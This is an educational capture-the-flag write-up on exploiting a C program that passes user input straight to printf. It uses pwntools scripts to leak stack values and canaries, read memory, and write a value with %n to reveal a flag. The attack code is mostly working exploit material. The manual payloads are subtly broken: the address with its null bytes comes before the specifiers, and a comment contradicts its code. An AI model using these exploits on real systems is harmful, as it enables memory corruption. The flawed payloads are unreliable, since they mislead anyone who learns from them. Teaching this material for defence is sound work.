---
title: "Pwn - Format String Attack"
description: "Exploiting printf with user-controlled format strings to leak stack data, read arbitrary memory, and write arbitrary values."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                          |
|------------|--------------------------------|
| Category   | Binary Exploitation            |
| Difficulty | Medium                         |
| Points     | 250                            |
| Flag       | `zemi{f0rm4t_str1ng_l34k}`     |

## Challenge Files

Download the challenge files to get started:

- [fmtstr.c](/Website/challenges/pwn-format-string/fmtstr.c)
- [Makefile](/Website/challenges/pwn-format-string/Makefile)
- [flag.txt](/Website/challenges/pwn-format-string/flag.txt)

## Introduction

What happens when you pass user input directly as the format string to `printf()`? Instead of `printf("%s", user_input)`, the code does `printf(user_input)`. This is a **format string vulnerability** — one of the most powerful bugs in C, allowing you to both **read** and **write** arbitrary memory.

Unlike buffer overflows that require overwriting the return address, format string attacks work through the normal behavior of `printf()` itself. By supplying format specifiers like `%x`, `%p`, `%s`, and `%n`, you can:

- **Leak stack values** (break ASLR, leak canaries)
- **Read arbitrary memory** (dereference pointers with `%s`)
- **Write arbitrary values** (write to any address with `%n`)

## Vulnerable Source Code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Compiled: gcc -no-pie -fno-stack-protector -o fmtstr fmtstr.c
// flag.txt contains: zemi{f0rm4t_str1ng_l34k}

int check = 0;

void win() {
    if (check == 0x1337) {
        FILE *f = fopen("flag.txt", "r");
        char flag[64];
        fgets(flag, 64, f);
        printf("FLAG: %s\n", flag);
        fclose(f);
    } else {
        printf("check = 0x%x (need 0x1337)\n", check);
    }
}

int main() {
    char buffer[128];

    printf("=== Format String Challenge ===\n");
    printf("Enter your string: ");
    fgets(buffer, 128, stdin);

    printf("You entered: ");
    printf(buffer);          // VULNERABLE: user input as format string!

    win();
    return 0;
}
```

Key observations:
- `printf(buffer)` uses our input as the format string
- There is a global variable `check` that must equal `0x1337` for `win()` to print the flag
- We need to use a format string attack to write `0x1337` to the address of `check`

## How Format String Attacks Work

When `printf` encounters a format specifier like `%x` or `%p`, it reads the next argument from the corresponding register or stack position. On x86-64, the first 6 arguments go in registers (RDI, RSI, RDX, RCX, R8, R9), then the stack.

But `printf(buffer)` has only ONE argument — the format string itself. There are no additional arguments. So `%x` reads whatever happens to be in RSI, the second `%x` reads RDX, and so on. After the registers are exhausted, it reads values from the stack.

This means we can read up the stack by supplying multiple `%p` specifiers.

## Step 1 — Leaking Stack Values with %p

`%p` prints a pointer-sized value in hex. Let's dump the stack:

```bash
echo 'AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./fmtstr
```

```
You entered: AAAA.0x7fffffff1234.0x7f1234567890.(nil).0x7f12345abcde.0x2.0x1.0x4141414100000a41.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025
```

Notice position 7: `0x4141414100000a41`. The `41` bytes are our `AAAA` (0x41 = 'A'). The `0a` is the newline from `fgets()`. Our input appears on the stack at the **7th** printf argument position.

We can also use **direct parameter access** to read a specific position:

```bash
echo '%7$p' | ./fmtstr
```

```
You entered: 0x70243725000a
```

This reads the 7th argument, which contains our input bytes.

## Step 2 — Understanding Direct Parameter Access

The syntax `%N$p` reads the N-th argument to printf. This is crucial because it lets us target specific stack positions without dumping everything before them.

```
%1$p  — 1st argument (RSI register)
%2$p  — 2nd argument (RDX register)
...
%6$p  — 6th argument (R9 register)
%7$p  — 1st value on the stack (after registers)
%8$p  — 2nd value on the stack
...
```

Let's find exactly where our input starts on the stack:

```bash
echo 'AAAABBBB.%7$p.%8$p.%9$p.%10$p' | ./fmtstr
```

Looking for `0x4141414141414141` (AAAAAAAA) or `0x4242424242424242` (BBBBBBBB) to identify the exact offset.

## Step 3 — Reading Arbitrary Memory with %s

`%s` treats the argument as a pointer and prints the string at that address. If we can place an address on the stack (as part of our input) and reference it with `%N$s`, we can read any readable memory.

For example, to read the string at address `0x404040`:

```python
from pwn import *

addr = p64(0x404040)  # address we want to read
# Place address at the start of our input, reference it with %7$s
# (assuming our input starts at offset 7)
payload = addr + b"%7$s"
```

When printf processes `%7$s`, it reads the value at stack position 7 (which is our packed address), treats it as a pointer, and prints the string at that address.

## Step 4 — Writing Arbitrary Values with %n

`%n` is the most dangerous format specifier. Instead of printing something, it **writes** the number of characters printed so far to the address pointed to by the argument.

```c
int count;
printf("Hello%n", &count);  // count = 5 (length of "Hello")
```

In a format string attack:
1. Place the target address on the stack (as part of our input)
2. Use `%Xc` to print exactly X characters (padding)
3. Use `%N$n` to write that count to the address at stack position N

To write `0x1337` (4919 decimal) to the address of `check`:

```python
# We need to write 4919 (0x1337) to the address of check
# If our address is at stack position 7:
payload = p64(check_addr) + b"%4911c%7$n"
# 4911 because the 8-byte address already contributes 8 printed chars
# 8 + 4911 = 4919 = 0x1337
```

Wait — there is a subtlety. The 8-byte address contains non-printable bytes that are still "printed" and counted by `%n`. We need to account for all characters printed before `%n`.

## Step 5 — Finding the Address of check

Since the binary has no PIE, the address of the global variable `check` is fixed:

```bash
objdump -t fmtstr | grep check
```

```
0000000000404050 g     O .bss   0000000000000004  check
```

Or with pwntools:

```python
from pwn import *
elf = ELF('./fmtstr')
check_addr = elf.symbols['check']
print(hex(check_addr))  # 0x404050
```

## Step 6 — Finding Our Input Offset

We need to find which printf argument position corresponds to the start of our buffer on the stack:

```python
from pwn import *

p = process('./fmtstr')
p.sendline(b"AAAAAAAA" + b".%p" * 20)
output = p.recvall().decode()
print(output)
```

Look for `0x4141414141414141` in the output. Count which position it appears at. Let's say it's position 8 (this varies by binary and compiler).

Or use a targeted approach:

```python
for i in range(1, 20):
    p = process('./fmtstr', level='error')
    p.sendline(f"AAAA%{i}$p".encode())
    result = p.recvall().decode()
    if '0x41414141' in result:
        print(f"Input found at offset {i}")
        break
    p.close()
```

## Step 7 — Crafting the Write Payload

For writing `0x1337` to `check`, we can use **two short writes** (`%hn` writes 2 bytes) or a single `%n` write (4 bytes). Using `%n` (writes 4 bytes) is simpler for small values:

```python
from pwn import *

elf = ELF('./fmtstr')
check_addr = elf.symbols['check']  # 0x404050

# Our input starts at printf argument offset 8 (example)
# We place the target address at the start of our buffer
# Then use %<count>c%8$n to write to it

# Characters printed before %n:
# - 8 bytes for the address itself
# We need 0x1337 = 4919 total characters printed
# So we need 4919 - 8 = 4911 characters of padding

payload  = p64(check_addr)       # 8 bytes, at stack position 8
payload += b"%4911c"             # print 4911 spaces
payload += b"%8$n"               # write count (8 + 4911 = 4919 = 0x1337) to *check_addr
```

## Step 8 — Using pwntools fmtstr_payload

pwntools has a built-in function that generates format string write payloads automatically:

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./fmtstr')
check_addr = elf.symbols['check']

# fmtstr_payload(offset, {address: value})
# offset = the printf argument position where our input starts
payload = fmtstr_payload(8, {check_addr: 0x1337})
```

This function handles all the complexity of splitting writes, calculating padding, and dealing with byte ordering.

## Full pwntools Solve Script

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF('./fmtstr')

# Address of the global variable 'check'
check_addr = elf.symbols['check']
log.info(f"check @ {hex(check_addr)}")

# Step 1: Find our input offset on the stack
# Send a known pattern and look for it
def find_offset():
    for i in range(1, 30):
        p = process('./fmtstr', level='error')
        p.sendlineafter(b"string: ", f"AAAA%{i}$p".encode())
        result = p.recvall(timeout=1)
        p.close()
        if b'0x41414141' in result:
            log.info(f"Input found at printf offset {i}")
            return i
    return None

offset = find_offset()
if offset is None:
    log.error("Could not find input offset!")
    exit(1)

# Step 2: Use fmtstr_payload to write 0x1337 to check
payload = fmtstr_payload(offset, {check_addr: 0x1337})
log.info(f"Payload size: {len(payload)} bytes")

# Make sure payload fits in the 128-byte buffer
assert len(payload) < 128, f"Payload too large: {len(payload)}"

# Step 3: Send the exploit
p = process('./fmtstr')
p.sendlineafter(b"string: ", payload)

# Step 4: Receive the flag
output = p.recvall(timeout=3).decode()
print(output)

p.close()
```

```
[*] check @ 0x404050
[*] Input found at printf offset 8
[*] Payload size: 72 bytes
[+] Starting local process './fmtstr': pid 11111
[+] Receiving all data: Done
You entered: ... (lots of padding characters)
FLAG: zemi{f0rm4t_str1ng_l34k}
```

## Manual Solve (Without fmtstr_payload)

For those who want to understand the internals:

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./fmtstr')
check_addr = elf.symbols['check']

# Our input starts at offset 8 on the stack
# We need to write 0x1337 (4919) to check_addr

# Strategy: use %hn (2-byte write) to write 0x1337 to the lower 2 bytes
# Place the address at the beginning of our payload
# Account for the bytes already printed

# Address is 8 bytes, printed as characters
already_printed = 8
need_to_print = 0x1337 - already_printed  # 4911

payload  = p64(check_addr)
payload += f"%{need_to_print}c".encode()
payload += b"%8$n"

p = process('./fmtstr')
p.sendlineafter(b"string: ", payload)
output = p.recvall(timeout=5).decode()
print(output[-50:])  # last 50 chars to see the flag
p.close()
```

## Using Format Strings for Information Leaks

Format strings are extremely useful for **leaking information** even when you don't need to write:

### Leak Stack Canary
```python
# If the canary is at position 11:
p.sendline(b"%11$p")
canary = int(p.recvline(), 16)
```

### Leak libc Address (for ASLR bypass)
```python
# If a libc return address is at position 15:
p.sendline(b"%15$p")
libc_leak = int(p.recvline(), 16)
libc_base = libc_leak - known_offset
```

### Leak PIE Base
```python
# If a binary address is at position 13:
p.sendline(b"%13$p")
pie_leak = int(p.recvline(), 16)
pie_base = pie_leak - known_offset
```

## Format Specifier Reference

| Specifier | Action                                        |
|-----------|-----------------------------------------------|
| `%p`      | Print pointer (8 bytes on x86-64)             |
| `%x`      | Print as hex (4 bytes)                        |
| `%lx`     | Print as long hex (8 bytes)                   |
| `%s`      | Dereference as pointer, print string           |
| `%n`      | Write 4 bytes (count of chars printed so far)  |
| `%hn`     | Write 2 bytes (short)                          |
| `%hhn`    | Write 1 byte (char)                            |
| `%ln`     | Write 8 bytes (long)                           |
| `%N$`     | Direct parameter access (Nth argument)         |
| `%Xc`     | Print X characters (padding for %n)            |

## Tools Used

- **GDB** — inspect stack layout, verify addresses, trace printf behavior
- **objdump** — find address of global variables (`check`)
- **pwntools** — `fmtstr_payload()` for automatic exploit generation, `ELF` for symbol lookup
- **checksec** — verify binary protections

## Lessons Learned

- **Never** pass user input as the format string to `printf()` — always use `printf("%s", input)`
- Format string bugs allow both **reading** (stack leaks, arbitrary reads) and **writing** (arbitrary writes with `%n`)
- `%n` writes the count of characters printed so far — by controlling the padding, you control the value written
- `fmtstr_payload()` in pwntools automates the complex task of calculating offsets and padding for writes
- Format string leaks are often the **first step** in bypassing ASLR — leak a libc address, compute the base, then use ret2libc or ROP
- The **offset** (which printf argument corresponds to your input) varies by binary and must be determined empirically
- `%hn` (2-byte write) and `%hhn` (1-byte write) are useful for writing large values without printing millions of characters
- Modern compilers warn about `printf(variable)` — always use `-Wformat-security`
